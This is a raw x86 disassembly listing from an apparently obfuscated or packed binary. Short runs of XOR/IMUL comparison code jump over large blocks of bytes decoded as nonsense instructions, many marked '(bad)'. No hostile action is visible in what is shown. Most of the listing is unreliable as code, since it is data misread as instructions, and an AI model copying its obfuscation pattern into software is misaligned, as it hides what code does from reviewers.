  404177:	vandps xmm5,xmm6,XMMWORD PTR ds:0xe19a57b
  40417f:	and    eax,0xc5d0b759
  404184:	pop    ss
  404185:	popf   
  404186:	mov    ds:0xc269ef3e,eax
  40418b:	shl    ecx,cl
  40418d:	in     al,dx
  40418e:	ficom  WORD PTR [eax+0x2e823025]
  404194:	mov    bl,0x3f
  404196:	jmp    0x404206
  404198:	repz push ecx
  40419a:	dec    esi
  40419b:	jmp    0x404212
  40419d:	lahf   
  40419e:	add    al,BYTE PTR [ecx]
  4041a0:	ss xchg ebx,eax
  4041a2:	sub    edx,ebp
  4041a4:	out    dx,al
  4041a5:	inc    esp
  4041a6:	in     eax,dx
  4041a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041a8:	mov    ebp,0xfc090068
  4041ad:	ins    BYTE PTR es:[edi],dx
  4041ae:	sti    
  4041af:	stos   DWORD PTR es:[edi],eax
  4041b0:	rcr    DWORD PTR [ecx-0x15],0x62
  4041b4:	outs   dx,DWORD PTR ds:[esi]
  4041b5:	dec    ecx
  4041b6:	sub    edi,eax
  4041b8:	pop    esp
  4041b9:	inc    edx
  4041ba:	fild   QWORD PTR [edi+ebx*8+0xaa42c11]
  4041c1:	cmp    ecx,DWORD PTR [esi-0x413a6eda]
  4041c7:	push   ebx
  4041c8:	pop    ss
  4041c9:	mov    cl,0xfb
  4041cb:	aam    0x9f
  4041cd:	loop   0x4041c8
  4041cf:	inc    ecx
  4041d0:	outs   dx,DWORD PTR ds:[esi]
  4041d1:	call   0x58c67037
  4041d6:	inc    edx
  4041d7:	sub    al,0xe9
  4041d9:	jbe    0x404181
  4041db:	inc    esp
  4041dc:	xchg   ebp,eax
  4041dd:	mov    bh,0x9b
  4041df:	fmulp  st(7),st
  4041e1:	push   ecx
  4041e2:	(bad)  
  4041e3:	jle    0x40418e
  4041e5:	pop    esi
  4041e6:	xchg   esp,eax
  4041e7:	(bad)  
  4041e8:	inc    ecx
  4041e9:	jo     0x40420f
  4041eb:	call   esp
  4041ed:	jmp    0xf8cfd013
  4041f2:	mov    ebp,0xaa6758b9
  4041f7:	pop    es
  4041f8:	loope  0x404274
  4041fa:	fs push ebp
  4041fc:	inc    esi
  4041fd:	and    al,0x58
  4041ff:	jbe    0x404205
  404201:	add    dl,cl
  404203:	mov    dh,0x2
  404205:	xor    DWORD PTR [ebp-0x7c],ecx
  404208:	out    0xee,eax
  40420a:	jg     0x4041de
  40420c:	push   ecx
  40420d:	mov    bh,0xad
  40420f:	jae    0x404265
  404211:	std    
  404212:	repz call 0xae2be19c
  404218:	push   eax
  404219:	into   
  40421a:	sub    BYTE PTR [edi-0x6717e61f],dh
  404220:	in     al,0x61
  404222:	sbb    eax,0x3aaa8017
  404227:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404229:	cld    
  40422a:	pop    edx
  40422b:	mov    cl,0xe9
  40422d:	das    
  40422e:	jle    0x4041e3
  404230:	lods   eax,DWORD PTR ds:[esi]
  404231:	jo     0x404273
  404233:	fwait
  404234:	jbe    0x4041e4
  404236:	mov    dh,0x3b
  404238:	cld    
  404239:	xor    edx,DWORD PTR [esi+0x6e]
  40423c:	jl     0x404273
  40423e:	ins    DWORD PTR es:[edi],dx
  40423f:	rol    BYTE PTR ds:0xddb09a53,0x38
  404246:	pop    edi
  404247:	fwait
  404248:	sub    ch,dh
  40424a:	fstp   DWORD PTR [edx-0x7cc2fcd]
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	fistp  WORD PTR [ecx+0x16ed7a5e]
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4042e3
  40426e:	imul   esp,DWORD PTR [eax],0xffffff9a
  404271:	xor    DWORD PTR [esi+0x6473fe5],edx
  404277:	in     al,0x1
  404279:	jae    0x404254
  40427b:	shl    cl,cl
  40427d:	sbb    esi,DWORD PTR [edi+0x39]
  404280:	dec    edx
  404281:	iret   
  404282:	xlat   BYTE PTR ds:[ebx]
  404283:	enter  0x5d7,0x8f
  404287:	pop    esi
  404288:	jno    0x40420d
  40428a:	add    DWORD PTR [edx+0x72],ecx
  40428d:	aaa    
  40428e:	mov    ebp,0x6e261eb9
  404293:	loopne 0x4042cb
  404295:	xchg   ebp,eax
  404296:	cmp    ebx,DWORD PTR [ebp-0xa]
  404299:	push   cs
  40429a:	xchg   esp,eax
  40429b:	in     eax,dx
  40429c:	frstor [ecx]
  40429e:	fwait
  40429f:	in     al,dx
  4042a0:	ret    0x41e4
  4042a3:	imul   eax,DWORD PTR [edi],0x2
  4042a6:	loopne 0x404323
  4042a8:	jbe    0x40424b
  4042aa:	mov    ch,0xef
  4042ac:	mov    cl,0x6e
  4042ae:	sub    al,0xda
  4042b0:	add    BYTE PTR [edi-0x1e],0x9c
  4042b4:	mov    eax,0x6284d37f
  4042b9:	popf   
  4042ba:	sbb    dl,BYTE PTR [ebx]
  4042bc:	out    0x82,eax
  4042be:	mov    bl,BYTE PTR [ecx+edi*1-0x23]
  4042c2:	(bad)  
  4042c3:	fistp  DWORD PTR [ebx]
  4042c5:	dec    edx
  4042c6:	cmp    BYTE PTR [edi],bl
  4042c8:	pop    ecx
  4042c9:	mov    ebp,0xbf54b601
  4042ce:	dec    esi
  4042cf:	retf   0x7bda
  4042d2:	pushf  
  4042d3:	jnp    0x404329
  4042d5:	push   ds
  4042d6:	mov    eax,ds:0x56484c13
  4042db:	xchg   cl,bh
  4042dd:	arpl   di,bx
  4042df:	adc    dh,BYTE PTR [edi]
  4042e1:	div    BYTE PTR [edi+0xb]
  4042e4:	stos   DWORD PTR es:[edi],eax
  4042e5:	jecxz  0x40433d
  4042e7:	into   
  4042e8:	(bad)  
  4042e9:	pop    edi
  4042ea:	inc    edx
  4042eb:	inc    edi
  4042ec:	retf   0x9599
  4042ef:	mov    bh,dl
  4042f1:	add    al,0x4a
  4042f3:	cmp    BYTE PTR [ecx],0x70
  4042f6:	aaa    
  4042f7:	xchg   WORD PTR [edx+ebx*1+0x7],si
  4042fc:	xor    edi,DWORD PTR [edx]
  4042fe:	or     eax,0xc61ac57
  404303:	ins    DWORD PTR es:[edi],dx
  404304:	and    eax,0x64b5723f
  404309:	mov    dl,0x56
  40430b:	push   ecx
  40430c:	cld    
  40430d:	cmp    DWORD PTR [edi],ebp
  40430f:	xor    BYTE PTR [ebp+0x78],bh
  404312:	imul   edi,DWORD PTR [ebp+0x37],0x498c2120
  404319:	mov    WORD PTR [edx-0x24],?
  40431c:	push   es
  40431d:	inc    ebp
  40431e:	fwait
  40431f:	in     al,0x35
  404321:	pop    edx
  404322:	sar    DWORD PTR [edi+0x27],1
  404325:	jo     0x4043a4
  404327:	fidivr DWORD PTR [eax]
  404329:	or     al,0xc7
  40432b:	jb     0x404366
  40432d:	sbb    eax,DWORD PTR [esi]
  40432f:	pop    esi
  404330:	inc    ebp
  404331:	(bad)  
  404332:	jl     0x404312
  404334:	pop    es
  404335:	aad    0xf1
  404337:	cwde   
  404338:	daa    
  404339:	sti    
  40433a:	stos   BYTE PTR es:[edi],al
  40433b:	jo     0x40438c
  40433d:	aam    0x37
  40433f:	mov    esp,0x471cbb26
  404344:	dec    ecx
  404345:	and    al,0x60
  404347:	in     eax,dx
  404348:	addr16 mov dl,0x1
  40434b:	jle    0x4042f2
  40434d:	call   0xc37c0c3a
  404352:	push   es
  404353:	pop    ecx
  404354:	les    esp,FWORD PTR [ebp-0x2d]
  404357:	cmp    DWORD PTR [edi+0x45b526f],eax
  40435d:	pop    ebx
  40435e:	push   esp
  40435f:	inc    edi
  404360:	cli    
  404361:	or     ecx,DWORD PTR [edi+0x37]
  404364:	aaa    
  404365:	cli    
  404366:	cmp    WORD PTR ds:0x1966d173,ax
  40436d:	mov    DWORD PTR [ecx+0x1a32fb3f],eax
  404373:	ds jmp 0xc7aa33d1
  404379:	mov    ecx,0x5afb6f4e
  40437e:	rcr    BYTE PTR [esi],0xb1
  404381:	push   eax
  404382:	xchg   edx,eax
  404383:	pop    ds
  404384:	test   BYTE PTR [edx],dl
  404386:	in     al,dx
  404387:	push   esp
  404388:	test   ah,ah
  40438a:	sub    edx,DWORD PTR [ebp-0x4bc6c41a]
  404390:	jbe    0x40439e
  404392:	cs adc cl,al
  404395:	test   al,0x56
  404397:	mov    bl,BYTE PTR [ebp-0x436ad86]
  40439d:	ins    DWORD PTR es:[edi],dx
  40439e:	lods   al,BYTE PTR ds:[esi]
  40439f:	jle    0x404364
  4043a1:	jmp    0xb7ddff58
  4043a6:	or     bl,BYTE PTR [ecx+0x5a]
  4043a9:	mov    dl,0xb0
  4043ab:	into   
  4043ac:	test   BYTE PTR [eax],dh
  4043ae:	xchg   esi,eax
  4043af:	bound  edx,QWORD PTR [esi-0x10c8e212]
  4043b5:	test   BYTE PTR [edx+eiz*4-0x28c3afbb],0xb1
  4043bd:	push   es
  4043be:	mov    ecx,0xc97da0d5
  4043c3:	pop    ecx
  4043c4:	inc    ebp
  4043c5:	sbb    edx,DWORD PTR [ecx+0x7a02da0d]
  4043cb:	push   ebp
  4043cc:	daa    
  4043cd:	mov    dh,0x39
  4043cf:	mov    ah,0x9
  4043d1:	pushf  
  4043d2:	pop    ebp
  4043d3:	repnz lea ebx,[ebp-0x7a]
  4043d7:	mov    BYTE PTR [edi+edx*8],dl
  4043da:	lahf   
  4043db:	retf   0x6f77
  4043de:	das    
  4043df:	leave  
  4043e0:	daa    
  4043e1:	xor    eax,0x8876d6fb
  4043e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e7:	repz mov edi,0x265365a0
  4043ed:	inc    esp
  4043ee:	or     BYTE PTR [ebx-0x74de6b09],dh
  4043f4:	and    eax,0xe161e8ec
  4043f9:	pop    eax
  4043fa:	add    edi,ecx
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xbdee5bdf,al
  40444e:	mov    ah,0x7a
  404450:	pop    ss
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x404425
  404458:	xor    BYTE PTR [eax-0x3d],dh
  40445b:	pushf  
  40445c:	pushf  
  40445d:	mov    esi,0x821be580
  404462:	push   ebx
  404463:	xchg   edx,eax
  404464:	xor    al,0xeb
  404466:	jge    0x40445f
  404468:	cmp    bl,BYTE PTR [edi-0x51]
  40446b:	fwait
  40446c:	int3   
  40446d:	dec    esi
  40446e:	sahf   
  40446f:	(bad)  [ecx]
  404471:	outs   dx,DWORD PTR ds:[esi]
  404472:	inc    ecx
  404473:	mov    ebp,0xe7a71b3f
  404478:	jmp    0x8c01fa22
  40447d:	pushf  
  40447e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40447f:	ds nop
  404481:	push   ds
  404482:	dec    ebp
  404483:	xor    eax,esp
  404485:	test   eax,0xdea3fbc9
  40448a:	and    bh,BYTE PTR [ecx]
  40448c:	sub    BYTE PTR [eax],dl
  40448e:	or     eax,0x2d47f5f2
  404493:	mov    al,0x75
  404495:	push   edi
  404496:	lods   al,BYTE PTR ds:[esi]
  404497:	pop    eax
  404498:	je     0x4044ba
  40449a:	nop
  40449b:	imul   esi,DWORD PTR [edi+0x5a759c5f],0x3ff2811
  4044a5:	(bad)  
  4044a6:	mov    ah,0xbb
  4044a8:	out    0xfa,al
  4044aa:	jmp    0xd73fdacd
  4044af:	cld    
  4044b0:	test   al,0xce
  4044b2:	pusha  
  4044b3:	dec    esp
  4044b4:	stc    
  4044b5:	jmp    0x4044b5
  4044b7:	xchg   ebp,eax
  4044b8:	and    ah,ch
  4044ba:	xor    esi,DWORD PTR [ecx+0x7c068828]
  4044c0:	pslld  mm3,mm0
  4044c3:	sbb    eax,0xfb4a823d
  4044c8:	xlat   BYTE PTR ds:[ebx]
  4044c9:	sbb    esp,DWORD PTR [ebx+0x5467501b]
  4044cf:	and    ch,BYTE PTR [esi-0x5b]
  4044d2:	rol    BYTE PTR [esi-0x53b15314],1
  4044d8:	mov    ebx,0xcba9cf83
  4044dd:	jno    0x4044e9
  4044df:	jb     0x40447f
  4044e1:	(bad)  [ecx-0x1e]
  4044e4:	xchg   edi,eax
  4044e5:	push   ebp
  4044e6:	xor    edi,ebp
  4044e8:	sbb    eax,0xd4b6fa15
  4044ed:	cwde   
  4044ee:	inc    ebp
  4044ef:	or     ebx,DWORD PTR [ecx+0x10260627]
  4044f5:	sub    BYTE PTR [ebx-0x2f],bl
  4044f8:	xchg   edx,eax
  4044f9:	push   0x27b24ef3
  4044fe:	test   eax,0xca085809
  404503:	scas   al,BYTE PTR es:[edi]
  404504:	and    DWORD PTR [ebx-0x7442f88d],ebp
  40450a:	ret    0x3ceb
  40450d:	and    esi,DWORD PTR fs:[edi]
  404510:	shl    BYTE PTR [ebp+0x173d1812],cl
  404516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404517:	pop    edi
  404518:	scas   eax,DWORD PTR es:[edi]
  404519:	jo     0x40453a
  40451b:	test   BYTE PTR [ebx-0x2a],ch
  40451e:	mov    edi,0x42805908
  404523:	(bad)  
  404524:	cmp    eax,0x5760a20
  404529:	scas   eax,DWORD PTR es:[edi]
  40452a:	lods   eax,DWORD PTR ds:[esi]
  40452b:	or     al,0x5f
  40452d:	add    BYTE PTR [ecx+ebp*8-0x1cc43fe0],0x6d
  404535:	stos   BYTE PTR es:[edi],al
  404536:	cli    
  404537:	xchg   ebx,eax
  404538:	jns    0x4045b7
  40453a:	or     BYTE PTR [edx-0x12876e6a],0x5c
  404541:	lods   al,BYTE PTR ds:[esi]
  404542:	pop    edx
  404543:	sub    al,0x12
  404545:	dec    ebx
  404546:	ret    0xca95
  404549:	push   ebp
  40454a:	repz sbb BYTE PTR [ebx+0x4ba359b8],dl
  404551:	(bad)  
  404552:	or     ebx,ecx
  404554:	pop    edi
  404555:	adc    ecx,esi
  404557:	stos   DWORD PTR es:[edi],eax
  404558:	sti    
  404559:	ss xchg ebx,edx
  40455c:	fiadd  DWORD PTR [eax+ecx*4+0x25]
  404560:	sti    
  404561:	xor    BYTE PTR [eiz*2+0x8c258f3],cl
  404568:	mov    dl,ah
  40456a:	push   0x1c
  40456c:	mov    dh,0xed
  40456e:	jge    0x404595
  404570:	(bad)  
  404571:	loopne 0x40455d
  404573:	sar    dh,0xc
  404576:	add    DWORD PTR [eax],ecx
  404578:	xchg   esi,eax
  404579:	jnp    0x4045c1
  40457b:	lods   eax,DWORD PTR ds:[esi]
  40457c:	stc    
  40457d:	push   es
  40457e:	stos   DWORD PTR es:[edi],eax
  40457f:	jb     0x40459e
  404581:	pushf  
  404582:	in     eax,dx
  404583:	jl     0x404554
  404585:	jne    0x4045bb
  404587:	lock sti 
  404589:	mov    ebp,0x52bc1af2
  40458e:	fld    DWORD PTR [ecx+0x1f7ec2ce]
  404594:	xchg   ebx,eax
  404595:	sbb    DWORD PTR [ecx],esp
  404597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404598:	jl     0x404565
  40459a:	adc    al,ah
  40459c:	mov    dh,BYTE PTR [edi+0xed068e]
  4045a2:	sbb    ch,ch
  4045a4:	fs fucomp st(0)
  4045a7:	ins    BYTE PTR es:[edi],dx
  4045a8:	clc    
  4045a9:	retf   0x9ba5
  4045ac:	scas   eax,DWORD PTR es:[edi]
  4045ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045ae:	mov    dh,0xcc
  4045b0:	(bad)  [ecx]
  4045b2:	mov    eax,0xe3919e1e
  4045b7:	xchg   ecx,eax
  4045b8:	cmp    cl,al
  4045ba:	xchg   esp,eax
  4045bb:	dec    esi
  4045bc:	jmp    0x40460b
  4045be:	sub    eax,0xca8180ef
  4045c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045c4:	xlat   BYTE PTR ds:[ebx]
  4045c5:	sar    DWORD PTR [edi],0x9e
  4045c8:	push   cs
  4045c9:	push   eax
  4045ca:	retf   0x278e
  4045cd:	cmp    BYTE PTR [edx],bh
  4045cf:	push   0xffffffc2
  4045d1:	in     eax,dx
  4045d2:	sub    DWORD PTR [edx],ecx
  4045d4:	ficom  WORD PTR [esi-0x79]
  4045d7:	call   0xbb0:0x1b0611b5
  4045de:	push   esi
  4045df:	mov    bh,0xb9
  4045e1:	popa   
  4045e2:	push   ds
  4045e3:	jnp    0x282a123e
  4045e9:	add    BYTE PTR [eax],al
  4045eb:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4045f1:	cld    
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x4bce40d0],al
  40466a:	call   0x7e6a3e6e
  40466f:	jle    0x4045fc
  404671:	jg     0x4046f1
  404673:	jle    0x404632
  404675:	dec    edx
  404676:	adc    al,0xa2
  404678:	push   ebp
  404679:	(bad)  
  40467a:	jle    0x404600
  40467c:	repz add DWORD PTR [eax+0x4b5a4997],eax
  404683:	and    ecx,ecx
  404685:	or     eax,0xebed272b
  40468a:	mov    al,dl
  40468c:	push   ebp
  40468d:	shr    BYTE PTR [edi+0x42],0x29
  404691:	mov    fs,edx
  404693:	add    ch,BYTE PTR [ecx]
  404695:	add    esp,esi
  404697:	mov    dl,0xad
  404699:	inc    eax
  40469a:	adc    ebx,DWORD PTR [esi-0x70]
  40469d:	pop    ecx
  40469e:	or     ecx,DWORD PTR [edx+0x4d90aae8]
  4046a4:	int    0xb7
  4046a6:	sahf   
  4046a7:	jne    0x404659
  4046a9:	mov    al,0x21
  4046ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046ac:	or     edx,DWORD PTR [eax-0x1f]
  4046af:	leave  
  4046b0:	das    
  4046b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046b2:	retf   
  4046b3:	dec    esp
  4046b4:	or     DWORD PTR [edx+0x16],edi
  4046b7:	mov    ebx,edx
  4046b9:	adc    DWORD PTR fs:[esi+0x24],ebp
  4046bd:	stos   BYTE PTR es:[edi],al
  4046be:	fimul  WORD PTR [ecx-0x3b10bdde]
  4046c4:	mov    dh,0x79
  4046c6:	xchg   esp,eax
  4046c7:	xchg   ebx,eax
  4046c8:	enter  0xe78a,0xf5
  4046cc:	mov    cl,0xbf
  4046ce:	fisub  WORD PTR [eax-0x38ff6f73]
  4046d4:	adc    ebx,esi
  4046d6:	ds dec ecx
  4046d8:	fmul   DWORD PTR [ebx-0x15]
  4046db:	xchg   esi,eax
  4046dc:	mov    esi,0x842c38aa
  4046e1:	ds push 0xe8a09f41
  4046e7:	push   eax
  4046e8:	xlat   BYTE PTR ds:[ebx]
  4046e9:	test   al,0x68
  4046eb:	data16 jp 0x40469a
  4046ee:	fistp  WORD PTR [edi+0x29498f68]
  4046f4:	cmp    eax,0xb0beffd5
  4046f9:	jmp    0x4046f2
  4046fb:	push   es
  4046fc:	and    BYTE PTR [ebx-0x57],ch
  4046ff:	mov    eax,eax
  404701:	scas   eax,DWORD PTR es:[edi]
  404702:	or     eax,0x1cfa1077
  404707:	mov    al,0x28
  404709:	(bad)  
  40470a:	fst    DWORD PTR [ecx-0x67252053]
  404710:	ret    
  404711:	adc    esp,DWORD PTR [edx-0x10]
  404714:	inc    esp
  404715:	ins    DWORD PTR es:[edi],dx
  404716:	add    BYTE PTR [eax],0x96
  404719:	test   DWORD PTR [ebx-0x7606cc53],ecx
  40471f:	das    
  404720:	adc    bl,bl
  404722:	adc    DWORD PTR [edi+0x21600759],edi
  404728:	stc    
  404729:	idiv   BYTE PTR [edi]
  40472b:	clc    
  40472c:	hlt    
  40472d:	jno    0x4046cf
  40472f:	leave  
  404730:	lods   eax,DWORD PTR ds:[esi]
  404731:	repz or al,0xcb
  404734:	and    esi,esi
  404736:	sar    BYTE PTR [ebx+0x269b925a],cl
  40473c:	(bad)  
  40473d:	fsubr  DWORD PTR [edi]
  40473f:	into   
  404740:	and    eax,0x9d82816c
  404745:	inc    eax
  404746:	jecxz  0x40476f
  404748:	gs push esi
  40474a:	mov    ch,BYTE PTR [edi-0x32]
  40474d:	mov    al,ds:0xd055ff7f
  404752:	jo     0x4047ba
  404754:	push   ebx
  404755:	fmulp  st(4),st
  404757:	jp     0x4046f8
  404759:	jl     0x404728
  40475b:	push   ds
  40475c:	hlt    
  40475d:	out    0xa8,eax
  40475f:	mov    eax,ds:0xe6e37be1
  404764:	mov    edi,0x11e8184a
  404769:	test   eax,0x2a10874b
  40476e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40476f:	push   esp
  404770:	add    edx,DWORD PTR [eax]
  404772:	pop    eax
  404773:	mov    esp,0x1d03f740
  404778:	dec    ecx
  404779:	imul   ebx,edi,0xffffffd4
  40477c:	jmp    0xac7dfd4a
  404781:	cmc    
  404782:	in     eax,dx
  404783:	test   eax,0x8c5e7d20
  404788:	ret    0xaca8
  40478b:	enter  0x5049,0x97
  40478f:	sub    eax,0xd33621f6
  404794:	mov    ebx,0xe9031d16
  404799:	aam    0x37
  40479b:	mul    DWORD PTR [ebp-0x5a70ac04]
  4047a1:	popf   
  4047a2:	adc    al,0x38
  4047a4:	sbb    edx,DWORD PTR [eax+0x63fa47a]
  4047aa:	push   eax
  4047ab:	or     ecx,edi
  4047ad:	add    al,0x91
  4047af:	xchg   ebp,eax
  4047b0:	data16 xchg BYTE PTR [ebp-0x7471e89a],bh
  4047b7:	(bad)  
  4047b8:	aam    0x2e
  4047ba:	scas   eax,DWORD PTR es:[edi]
  4047bb:	(bad)  
  4047bc:	stc    
  4047bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047be:	cmp    eax,0x9e624351
  4047c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047c4:	jp     0x4047dc
  4047c6:	fcmovnu st,st(5)
  4047c8:	xchg   edi,eax
  4047c9:	les    eax,FWORD PTR [esi+0x6c]
  4047cc:	push   edx
  4047cd:	add    al,ah
  4047cf:	mov    edx,0x78cb57ee
  4047d4:	scas   eax,DWORD PTR es:[edi]
  4047d5:	or     dl,BYTE PTR [ebx]
  4047d7:	ins    DWORD PTR es:[edi],dx
  4047d8:	xchg   DWORD PTR [edi+edi*8-0x14f3c633],ebp
  4047df:	shl    BYTE PTR [ebx+ebx*2+0x6a54a948],cl
  4047e6:	dec    edi
  4047e7:	ja     0x404773
  4047e9:	sub    eax,0x5616505e
  4047ee:	adc    eax,0xce8b00ce
  4047f3:	push   ss
  4047f4:	add    bl,bl
  4047f6:	add    BYTE PTR [edi+0x67],ah
  4047f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047fa:	out    0x65,al
  4047fc:	inc    ebp
  4047fd:	adc    ch,cl
  4047ff:	mov    ch,0xef
  404801:	xor    edx,eax
  404803:	add    edx,DWORD PTR [ebp-0x14]
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x2c460f46],0xffba
  40482a:	int    0x4
  40482c:	sub    edi,DWORD PTR [esi+0x7e]
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x4048aa
  404834:	in     eax,0x54
  404836:	je     0x404866
  404838:	pop    ebx
  404839:	add    esi,DWORD PTR [ebx]
  40483b:	adc    DWORD PTR [edi-0x7f],ecx
  40483e:	rcr    edi,1
  404840:	xor    al,0xbf
  404842:	popa   
  404843:	mov    eax,?
  404845:	xchg   ecx,eax
  404846:	ins    DWORD PTR es:[edi],dx
  404847:	ds push eax
  404849:	jl     0x4047d1
  40484b:	inc    edi
  40484c:	lahf   
  40484d:	cdq    
  40484e:	or     DWORD PTR [ebx-0x7ccb7234],edx
  404854:	mov    ds:0xd53e71e2,al
  404859:	mov    al,ds:0xeeec7ba3
  40485e:	sbb    esp,edx
  404860:	imul   ebp,DWORD PTR [esi],0xc7f48111
  404866:	inc    ebp
  404867:	ss retf 
  404869:	loopne 0x4048e2
  40486b:	push   edi
  40486c:	stos   BYTE PTR es:[edi],al
  40486d:	cmp    eax,0x908f25c1
  404872:	arpl   si,di
  404874:	jmp    FWORD PTR [eax+0x76a22496]
  40487a:	out    0xc7,eax
  40487c:	xor    eax,0x85167e7e
  404881:	push   cs
  404882:	inc    esp
  404883:	test   ebx,ebx
  404885:	mov    bh,dl
  404887:	pop    es
  404888:	imul   esi,DWORD PTR [ebx+0x6c],0x2921de5
  40488f:	push   edx
  404890:	int    0x3a
  404892:	push   DWORD PTR [ecx-0x36]
  404895:	jae    0x404873
  404897:	sub    edx,ebp
  404899:	icebp  
  40489a:	hlt    
  40489b:	repz jne 0x404893
  40489e:	stos   DWORD PTR es:[edi],eax
  40489f:	pop    ds
  4048a0:	cli    
  4048a1:	in     eax,0x3c
  4048a3:	xor    al,0x64
  4048a5:	bound  edx,QWORD PTR [edx+0x2713df98]
  4048ab:	jecxz  0x404852
  4048ad:	neg    DWORD PTR [ebx]
  4048af:	repnz or eax,0xee848a59
  4048b5:	pop    ebx
  4048b6:	xchg   ecx,eax
  4048b7:	jecxz  0x4048d8
  4048b9:	fwait
  4048ba:	push   ecx
  4048bb:	lods   eax,DWORD PTR ds:[esi]
  4048bc:	mov    eax,ds:0x1b96f217
  4048c1:	xchg   esp,eax
  4048c2:	pop    ds
  4048c3:	xchg   edx,eax
  4048c4:	out    0x66,al
  4048c6:	push   esi
  4048c7:	mov    ecx,0xdb1417fc
  4048cc:	jbe    0x404922
  4048ce:	push   0x62e7054e
  4048d3:	bound  eax,QWORD PTR [edx+0x3d]
  4048d6:	lea    edi,[edi+0x26]
  4048d9:	jg     0x404905
  4048db:	xor    DWORD PTR ds:0x2425f76a,ebp
  4048e1:	sub    al,0xe5
  4048e3:	adc    cl,BYTE PTR [edi-0x42]
  4048e6:	jbe    0x404955
  4048e8:	pusha  
  4048e9:	sub    al,0xf6
  4048eb:	jne    0x404921
  4048ed:	in     eax,0x1e
  4048ef:	or     al,0x1f
  4048f1:	scas   al,BYTE PTR es:[edi]
  4048f2:	sbb    dl,bl
  4048f4:	cmp    ebx,DWORD PTR [eax-0x35]
  4048f7:	mov    dh,0x6f
  4048f9:	sahf   
  4048fa:	adc    DWORD PTR [ecx+0x4f],0xffffffa5
  4048fe:	and    DWORD PTR [ebp-0x6251d6d6],ebx
  404904:	and    eax,0x79d25403
  404909:	in     eax,dx
  40490a:	pop    ecx
  40490b:	dec    eax
  40490c:	pusha  
  40490d:	cmp    ebx,DWORD PTR [ebp+0x3b263311]
  404913:	ror    DWORD PTR [ecx-0x42],1
  404916:	sub    al,0x7a
  404918:	push   ss
  404919:	sub    edi,ebp
  40491b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40491c:	(bad)  
  40491d:	iret   
  40491e:	(bad)  [esi]
  404920:	adc    BYTE PTR [edi+0x131c68f1],dl
